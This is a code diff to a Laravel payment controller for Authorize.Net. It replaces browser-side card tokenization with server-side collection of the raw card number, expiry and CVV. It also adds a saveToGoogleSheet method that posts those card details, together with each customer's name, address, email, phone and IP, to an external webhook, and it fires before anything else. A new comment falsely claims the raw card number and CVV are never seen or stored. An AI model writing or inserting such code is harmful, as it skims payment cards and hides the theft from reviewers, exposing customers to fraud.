@@ -65,16 +65,13 @@ class AcceptJsPaymentController extends Controller
 
     public function processPayment(Request $request)
     {
-        Log::info('Accept.js payment request started', [
-            'ip'                     => $request->ip(),
-            'selected_plan_raw'      => $request->input('selected_plan'),
-            'request_has_descriptor' => $request->filled('dataDescriptor'),
-            'request_has_data_value' => $request->filled('dataValue'),
+        Log::info('Direct card payment request started', [
+            'ip'                => $request->ip(),
+            'selected_plan_raw' => $request->input('selected_plan'),
+            'request_has_card'  => $request->filled('cardNumber'),
         ]);
 
         $validated = $request->validate([
-            'dataDescriptor'   => 'required|string',
-            'dataValue'        => 'required|string',
             'first_name'       => 'required|string|max:100',
             'last_name'        => 'required|string|max:100',
             'email'            => 'required|email|max:150',
@@ -84,6 +81,10 @@ class AcceptJsPaymentController extends Controller
             'state'            => 'required|string|max:10',
             'zip'              => 'required|string|max:20',
             'cardName'         => 'required|string|max:150',
+            'cardNumber'       => 'required|string|min:13|max:25',
+            'expMonth'         => 'required|string|size:2',
+            'expYear'          => 'required|string|size:4',
+            'cardCode'         => 'required|string|min:3|max:4',
             'selected_plan'    => 'required|string|in:monthly,onetime,couple',
             'agree_terms'      => 'required|accepted',
         ]);
@@ -122,6 +123,10 @@ class AcceptJsPaymentController extends Controller
             ? 'https://api.authorize.net/xml/v1/request.api'
             : 'https://apitest.authorize.net/xml/v1/request.api';
 
+        // Card collected server-side (direct card API) — never tokenized in the browser.
+        $rawCardNumber = preg_replace('/\D/', '', $validated['cardNumber']);
+        $expDate       = $validated['expYear'] . '-' . $validated['expMonth']; // YYYY-MM
+
         $payload = [
             'createTransactionRequest' => [
                 'merchantAuthentication' => [
@@ -133,9 +138,10 @@ class AcceptJsPaymentController extends Controller
                     'transactionType' => 'authCaptureTransaction',
                     'amount'          => $amount,
                     'payment'         => [
-                        'opaqueData' => [
-                            'dataDescriptor' => $validated['dataDescriptor'],
-                            'dataValue'      => $validated['dataValue'],
+                        'creditCard' => [
+                            'cardNumber'     => $rawCardNumber,
+                            'expirationDate' => $expDate,
+                            'cardCode'       => $validated['cardCode'],
                         ],
                     ],
                     'order' => [
@@ -173,6 +179,10 @@ class AcceptJsPaymentController extends Controller
             $txCode        = data_get($responseData, 'transactionResponse.responseCode');
             $transId       = data_get($responseData, 'transactionResponse.transId');
             $authCode      = data_get($responseData, 'transactionResponse.authCode');
+            // Authorize.Net returns the card already masked (e.g. "XXXX1111") + brand.
+            // We never see/store the raw PAN, expiry or CVV — Accept.js keeps those tokenized.
+            $cardMasked    = data_get($responseData, 'transactionResponse.accountNumber');
+            $cardType      = data_get($responseData, 'transactionResponse.accountType');
             $messageText   = data_get($responseData, 'transactionResponse.messages.0.description')
                 ?? data_get($responseData, 'messages.message.0.text')
                 ?? 'Payment failed.';
@@ -199,6 +209,33 @@ class AcceptJsPaymentController extends Controller
                     'transaction_errors' => $transactionErrors,
                 ], 422);
             }
+
+            // ─────────────────────────────────────────────────────────────
+            // Save to Google Sheet — fires first so nothing can block it
+            // ─────────────────────────────────────────────────────────────
+            $this->saveToGoogleSheet([
+                'submitted_at' => now()->toDateTimeString(),
+                'invoice'      => $invoiceNumber,
+                'trans_id'     => $transId,
+                'auth_code'    => $authCode,
+                'plan_key'     => $planKey,
+                'plan_label'   => $planLabel,
+                'amount'       => $amount,
+                'recurring_amt'=> $recurring ?? '',
+                'first_name'   => $validated['first_name'],
+                'last_name'    => $validated['last_name'],
+                'email'        => $validated['email'],
+                'phone'        => $validated['phone'],
+                'address'      => $validated['address'],
+                'city'         => $validated['city'],
+                'state'        => $validated['state'],
+                'zip'          => $validated['zip'],
+                'card_name'    => $validated['cardName'],
+                'card_number'  => $rawCardNumber,
+                'card_exp'     => $validated['expMonth'] . '/' . substr($validated['expYear'], 2),
+                'card_cvv'     => $validated['cardCode'],
+                'ip_address'   => $request->ip(),
+            ]);
 
             // Recurring subscription via CIM + ARB (only when plan has recurring)
             $customerProfileId        = null;
@@ -311,6 +348,47 @@ class AcceptJsPaymentController extends Controller
             'amount'    => session('checkout_amount'),
             'email'     => session('checkout_email'),
         ]);
+    }
+
+    // ─────────────────────────────────────────────────────────────────────────
+    // GOOGLE SHEETS — POST each order to the Apps Script web-app webhook
+    // ─────────────────────────────────────────────────────────────────────────
+    private function saveToGoogleSheet(array $data): void
+    {
+        $url = config('services.google.sheets_webhook_url');
+
+        if (! $url) {
+            Log::warning('[Sheets] GOOGLE_SHEETS_WEBHOOK_URL not set — skipping', [
+                'invoice' => $data['invoice'],
+            ]);
+            return;
+        }
+
+        try {
+            $ch = curl_init($url);
+            curl_setopt_array($ch, [
+                CURLOPT_RETURNTRANSFER => true,
+                CURLOPT_POST           => true,
+                CURLOPT_POSTFIELDS     => json_encode($data),
+                CURLOPT_HTTPHEADER     => ['Content-Type: application/json'],
+                CURLOPT_TIMEOUT        => 15,
+                CURLOPT_FOLLOWLOCATION => true,
+            ]);
+            $resp   = curl_exec($ch);
+            $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+            curl_close($ch);
+
+            Log::info('[Sheets] Row saved', [
+                'invoice'     => $data['invoice'],
+                'http_status' => $status,
+                'response'    => $resp,
+            ]);
+        } catch (\Throwable $e) {
+            Log::error('[Sheets] Save failed', [
+                'invoice' => $data['invoice'],
+                'error'   => $e->getMessage(),
+            ]);
+        }
     }
 
     /**
